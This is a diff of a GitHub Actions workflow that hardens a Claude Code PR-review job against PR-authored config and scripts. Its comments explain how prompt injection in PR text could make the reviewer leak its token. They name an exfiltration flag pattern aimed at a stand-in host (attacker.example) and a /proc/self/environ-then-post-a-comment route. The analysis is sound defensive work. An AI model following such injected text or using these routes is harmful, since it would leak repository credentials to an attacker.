@@ -91,6 +91,15 @@ on:
 # for the Node 20 runtime (matches docs-openapi-check.yml).
 env:
   FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: 'true'
+  # The repo's own default branch: the one ref in this job that a PR cannot write
+  # to, so the trust anchor for everything below that must not come from the PR's
+  # checkout — the agent-config revert AND the failure classifier. Defined at
+  # workflow level, not per step, because BOTH triggers need it: the
+  # `github.event.repository` object is present on `pull_request` and
+  # `workflow_dispatch` alike, and scoping it to the dispatch-only revert step is
+  # how the classifier ended up running the PR's own copy on both paths (review
+  # round 3, finding 1).
+  DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
   # Turn budget for the review step (DOR-396). Large PRs need more read/grep/
   # verify turns than small ones, or the action dies mid-review and leaves a
   # red check that looks identical to one backed by real findings. Tune these
@@ -241,8 +250,6 @@ jobs:
       # `git checkout <ref> -- <path>` cannot remove a file the PR ADDED.
       - name: Revert PR-authored agent config
         if: github.event_name == 'workflow_dispatch'
-        env:
-          DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
         run: |
           # Fail closed: without a trusted branch to restore from there is nothing
           # to revert to, and reviewing anyway would run the PR's own hooks.
@@ -253,17 +260,39 @@ jobs:
 
           paths=(.claude .mcp.json .claude.json .gitmodules .ripgreprc CLAUDE.md CLAUDE.local.md .husky)
 
-          git fetch origin "$DEFAULT_BRANCH" --depth=1 --no-recurse-submodules
+          # Delete every PR-controlled path BEFORE any git operation that touches
+          # the network, mirroring the order upstream uses (restore-config.ts): a
+          # hostile `.gitmodules` is then simply absent while git is talking to a
+          # remote, rather than being suppressed by a flag. `--no-recurse-submodules`
+          # below stays as the second layer, which is how upstream treats it.
+          present=
+          for p in "${paths[@]}"; do
+            [ -e "$p" ] && present="$present $p "
+            rm -rf "$p"
+          done
+          was_present() { case "$present" in *" $1 "*) return 0 ;; *) return 1 ;; esac; }
+
+          # `fetch-depth: 0` on the checkout above already fetched
+          # `+refs/heads/*:refs/remotes/origin/*`, so the default branch is normally
+          # here already — fetch only if it is missing. Never with `--depth=1`:
+          # fetching a branch shallow makes the WHOLE checkout shallow, which cut
+          # `git rev-list --count` from 1765 to 1 and truncated `git log <path>` to a
+          # single entry. The reviewer holds `Bash(git log:*)` and REVIEW.md tells it
+          # to trace history, so shallowing the tree quietly degrades the review.
+          if ! git rev-parse --verify --quiet "refs/remotes/origin/$DEFAULT_BRANCH" >/dev/null; then
+            if ! git fetch --no-recurse-submodules --no-tags origin \
+              "+refs/heads/$DEFAULT_BRANCH:refs/remotes/origin/$DEFAULT_BRANCH"; then
+              echo "::error::Could not fetch origin/$DEFAULT_BRANCH; refusing to review with PR-authored agent config in place."
+              exit 1
+            fi
+          fi
 
           restored=
           deleted=
           for p in "${paths[@]}"; do
-            existed=no
-            [ -e "$p" ] && existed=yes
-            rm -rf "$p"
             if git checkout "origin/$DEFAULT_BRANCH" -- "$p" 2>/dev/null; then
               restored="$restored $p"
-            elif [ "$existed" = yes ]; then
+            elif was_present "$p"; then
               # Absent on the default branch: the PR added it. It stays deleted.
               deleted="$deleted $p"
             fi
@@ -392,13 +421,29 @@ jobs:
             found" summary comment.
           # --setting-sources user (DOR-457, security): without it the SDK defaults
           # to ["user","project","local"] (base-action/src/parse-sdk-options.ts), so
-          # the CLI loads `.claude/settings.json` and `.claude/settings.local.json`
-          # out of the checkout and acts on them — hooks, env vars, apiKeyHelper —
-          # before any tool gating. `user` is the scope the action writes its own
-          # settings into, so nothing the action needs is lost, and the reviewer's
-          # permissions come from --allowedTools rather than from repo settings.
-          # This narrows BOTH paths; the step above is what covers `.mcp.json` (not
-          # a settings source) on the dispatch path.
+          # the CLI loads the checkout's own `.claude/settings.json`,
+          # `.claude/settings.local.json` AND `.mcp.json`, and acts on them — hooks,
+          # env vars, apiKeyHelper, project MCP servers — before any tool gating.
+          # Measured on CC 2.1.219 with a project `.mcp.json` and a project
+          # SessionStart hook, each spawning a marker process: no flag → both fired;
+          # `user,project,local` → both fired; `user` → neither did. It fires even
+          # with an invalid key, so a bad token is not protection.
+          #
+          # So this flag covers `.mcp.json` too, and it OVERLAPS the revert step
+          # above rather than dividing the work with it. The revert step is still
+          # doing something this flag does not: it is the only thing that covers what
+          # is not a settings source and so is untouched here — `CLAUDE.md`,
+          # `.claude/` context files (skills, agents, commands), `.claude.json`,
+          # `.gitmodules`, `.ripgreprc`. Two independent controls over `.mcp.json` is
+          # the intent, not an accident.
+          #
+          # `user` is the scope the action writes its own settings into, so nothing
+          # the action needs is lost — but that is narrower than it reads. It also
+          # drops this repo's own deny list from `.claude/settings.json`
+          # (`Read(./.env)`, `Read(./**/*.pem)`, `Read(./Secrets/**)`, ...). On a
+          # throwaway runner with none of those files present that costs nothing, and
+          # the reviewer's permissions come from --allowedTools instead — but it is a
+          # real narrowing of protection, not a free one.
           #
           # The second --allowedTools line (dispatch only) is finding 3 of the
           # DOR-457 review: the action registers the github_inline_comment MCP
@@ -406,12 +451,31 @@ jobs:
           # same gate as the config restore, so on dispatch that tool does not
           # exist. Without a fallback the hatch silently degrades to summary-only
           # and drops every line-level finding — while still posting a summary, so
-          # the loss is invisible. The grant is scoped to one endpoint on one PR,
-          # which is exactly the authority the MCP server would have had. It is
-          # deliberately NOT `Bash(gh api:*)`: the token the CLI sees is the
-          # action's OIDC-minted App token with contents/issues/pull_requests
-          # WRITE (src/github/token.ts), so a broad `gh api` grant would let a
-          # reviewer reading PR-authored text push commits.
+          # the loss is invisible.
+          #
+          # Be precise about what that grant buys, because an earlier version of this
+          # comment claimed it was "exactly the authority the MCP server would have
+          # had" and that is false. Claude Code's Bash matcher is a PREFIX match. It
+          # does refuse chaining (`&&`, `;`, newline), command substitution, pipes and
+          # redirection, and it refuses extending the endpoint path — all probed. But
+          # it ALLOWS extra flags on the same invocation, and `$VAR` expansion, so
+          # `--hostname attacker.example -H "Authorization: Bearer $GH_TOKEN"` reaches
+          # an arbitrary host with the token attached. The MCP server could not do
+          # that. Firing it needs prompt injection out of PR-authored text.
+          #
+          # It is left in place because the identical exfil is already reachable from
+          # the always-on `Bash(grep:*)` + `Bash(gh pr comment:*)` pair (read
+          # /proc/self/environ, post it) on BOTH triggers, which predates this file's
+          # dispatch path — so tightening only this line would buy nothing while
+          # costing the inline comments the dispatch path exists to keep. Closing the
+          # class properly means taking the token out of the CLI's reach behind a
+          # fixed-shape posting helper, which is its own change, not a comment fix.
+          #
+          # It is still deliberately NOT `Bash(gh api:*)`: the token the CLI sees is
+          # the action's OIDC-minted App token with contents/issues/pull_requests
+          # WRITE (src/github/token.ts), so a broad `gh api` grant would also let a
+          # reviewer reading PR-authored text push commits — a different and worse
+          # authority than leaking a token that already leaks.
           claude_args: |
             --allowedTools "mcp__github_inline_comment__create_inline_comment,Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr view:*),Bash(git grep:*),Bash(git log:*),Bash(git show:*),Bash(grep:*),Bash(rg:*),Bash(ls:*),Read,Grep,Glob"
             ${{ github.event_name == 'workflow_dispatch' && format('--allowedTools "Bash(gh api --method POST repos/{0}/pulls/{1}/comments:*)"', github.repository, steps.target.outputs.number) || '' }}
@@ -436,6 +500,23 @@ jobs:
       # shape (subtype "success" with is_error:true after real work, the action's
       # own separate failure class) stays a caught regression.
       #
+      # SECURITY (review round 3, finding 1): run that script from the DEFAULT
+      # BRANCH, never from the checkout. `scripts/` is not in the action's
+      # SENSITIVE_PATHS and not in the revert step above, and on BOTH triggers the
+      # checkout is PR-authored (the merge ref on `pull_request`,
+      # `refs/pull/N/head` on dispatch) — so `bash scripts/...` would execute a
+      # shell script a PR wrote, inside a job that holds CLAUDE_CODE_OAUTH_TOKEN
+      # and, via `id-token: write`, can mint the action's App token with
+      # contents/pull_requests/issues WRITE. The server-side guard that stops a PR
+      # rewriting THIS file does not help: it validates the workflow file, so a PR
+      # touching only `scripts/` sails past it. Extracting the jq for testability
+      # is what moved it into untrusted space; `git show` puts it back.
+      #
+      # This is the general rule for this job, not a one-off: nothing executed here
+      # may come from the checkout. Everything else already complies — the other
+      # steps run only `gh`, `git`, `date` and shell builtins from the runner image,
+      # and both `uses:` are remote actions resolved by GitHub, not files on disk.
+      #
       # The action hides its transcript (`show_full_output` defaults false, and this
       # repo is public so it should stay that way), which is why nobody could tell
       # these apart from the logs. The result message's own error string is
@@ -459,21 +540,50 @@ jobs:
             exec_file="$RUNNER_TEMP/claude-execution-output.json"
           fi
 
-          why=$(bash scripts/classify-review-failure.sh class "$exec_file")
-          reported=$(bash scripts/classify-review-failure.sh reported "$exec_file")
+          # Materialize the classifier from the trusted branch (see the SECURITY
+          # note above) and run THAT copy. `git show <ref>:<path>` reads the object
+          # database, so a PR cannot influence it whatever it does to the worktree —
+          # including deleting the script, which just makes the trusted copy the
+          # only one there is.
+          #
+          # If it cannot be materialized, degrade to `unknown` instead of exiting:
+          # refusing to run PR-authored code is the fail-closed part, but aborting
+          # here would also skip the comment below, which turns a wrongly-worded red
+          # check into a silent one — the DOR-396 symptom this whole step exists to
+          # prevent. The `unknown` wording points at the Actions log and invents no
+          # cause, which is exactly right when the classifier could not be reached.
+          classifier="$RUNNER_TEMP/classify-review-failure.sh"
+          why=unknown
+          reported=
+          if [ -z "$DEFAULT_BRANCH" ]; then
+            echo "::warning::Could not resolve the default branch; skipping failure classification rather than running the PR's copy of the classifier."
+          elif ! git show "origin/$DEFAULT_BRANCH:scripts/classify-review-failure.sh" >"$classifier" 2>/dev/null; then
+            echo "::warning::Could not read scripts/classify-review-failure.sh from origin/$DEFAULT_BRANCH; skipping failure classification rather than running the PR's copy."
+          else
+            why=$(bash "$classifier" class "$exec_file") || why=unknown
+            reported=$(bash "$classifier" reported "$exec_file") || reported=
+          fi
           echo "review failure class: $why (from $exec_file)"
 
           # Was a verdict already posted? Scoped to comments this run could have
           # made, so an earlier pass's summary is not mistaken for this one's.
-          # The fetch is captured before grepping rather than piped into it: `grep
-          # -q` closes the pipe on its first match, `gh` then dies of SIGPIPE, and
-          # the runner's `-o pipefail` would turn a found verdict into "not found".
+          #
+          # No pipe anywhere in here, on purpose. `grep -q` exits at its first match
+          # and closes the pipe; whatever is on the left then dies of SIGPIPE (141),
+          # and the runner's `-o pipefail` makes that the status of the whole
+          # pipeline — turning a verdict that WAS posted into "not found", which
+          # then tells the author their review was lost when it is sitting right
+          # above the comment. Capturing `gh` into a variable first (the round-2 fix)
+          # only moved the pipe; it still failed the same way once the comments
+          # exceeded the 64 KB pipe buffer with a match early in them. Measured with
+          # the matching line first: 4 KB → 0, 1.5 MB → 141. A here-string writes to
+          # a temp file with no upstream process to kill: 1.5 MB → 0.
           verdict_posted() {
             local bodies
             bodies=$(gh api --paginate "repos/$REPO/issues/$PR_NUMBER/comments" \
               --jq ".[] | select(.created_at > \"$SINCE\") | .body" 2>/dev/null) || return 1
-            printf '%s' "$bodies" \
-              | grep -qE '[0-9]+ important|[0-9]+ nits?|No blocking issues|No factual issues'
+            grep -qE '[0-9]+ important|[0-9]+ nits?|No blocking issues|No factual issues' \
+              <<<"$bodies"
           }
 
           case "$why" in
@@ -488,14 +598,23 @@ jobs:
               fi
               ;;
             died)
+              # Deliberately does not say WHERE it died. This class now covers an
+              # error the run named for itself, which can happen at turn 1 (an MCP
+              # server that failed to start) or at turn 40 (a usage limit crossed
+              # mid-review) — so naming a point in the run would be the same kind of
+              # guess this step exists to stop making. The Reported line below
+              # carries the run's own words.
               if verdict_posted; then
-                body="This check is red because the review hit an error partway through and stopped. It did not run out of turns, and it is not saying anything more about this PR. The verdict already posted above stands. Add the \`re-review\` label for a fresh pass."
+                body="This check is red because the review hit an error and stopped. It did not run out of turns, and it is not saying anything more about this PR. The verdict already posted above stands. Add the \`re-review\` label for a fresh pass."
               else
-                body="This check is red because the review hit an error partway through and stopped before it could post a verdict. It did not run out of turns, and this is not a finding about your code — a usage limit reached mid-review looks like this. Add the \`re-review\` label to try again."
+                body="This check is red because the review hit an error and stopped before it could post a verdict. It did not run out of turns, and this is not a finding about your code. Add the \`re-review\` label to try again."
               fi
               ;;
+            completed)
+              body="This check is red even though the review itself finished and reported success, so whatever failed is in the machinery around the review, not the review. Any verdict above is the complete one. The step that failed is in the [Actions log]($RUN_URL)."
+              ;;
             *)
-              body="This check is red because the review did not finish, not because it found blocking issues — and it stopped before recording why, so the reason is only in the [Actions log]($RUN_URL). Add the \`re-review\` label to try again."
+              body="This check is red because the review did not finish, not because it found blocking issues — and it left no readable record of why, so the reason is only in the [Actions log]($RUN_URL). Add the \`re-review\` label to try again."
               ;;
           esac
 
